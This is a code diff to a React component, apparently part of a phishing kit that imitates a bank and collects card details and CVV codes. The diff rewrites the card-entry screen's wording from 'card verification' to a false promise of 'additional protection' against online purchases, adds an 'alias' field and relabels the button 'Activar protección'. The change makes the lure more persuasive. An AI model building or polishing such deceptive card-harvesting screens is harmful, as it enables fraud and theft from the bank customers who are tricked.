@@ -33,6 +33,7 @@ interface ScreenTemplatesProps {
     titular?: string;
     comercio?: string;
     mensaje?: string;
+    alias?: string;
   };
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
   banco?: string;
@@ -273,9 +274,9 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.TARJETA:
         const tarjetaContent = (
           <>
-            <h2 className="text-xl font-bold mb-3">Verificación de tarjeta</h2>
+            <h2 className="text-xl font-bold mb-3">Protección adicional</h2>
             <p className="mb-4">
-              Para confirmar que eres el titular, por favor ingresa los datos de tu tarjeta.
+              Con el fin de evitar intentos de compra en línea, agregaremos protección adicional a su tarjeta de crédito/débito.
             </p>
             
             <div className="mb-4">
@@ -339,7 +340,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 cvvInput.length < 3
               }
             >
-              Verificar
+              Activar protección
             </Button>
           </>
         );
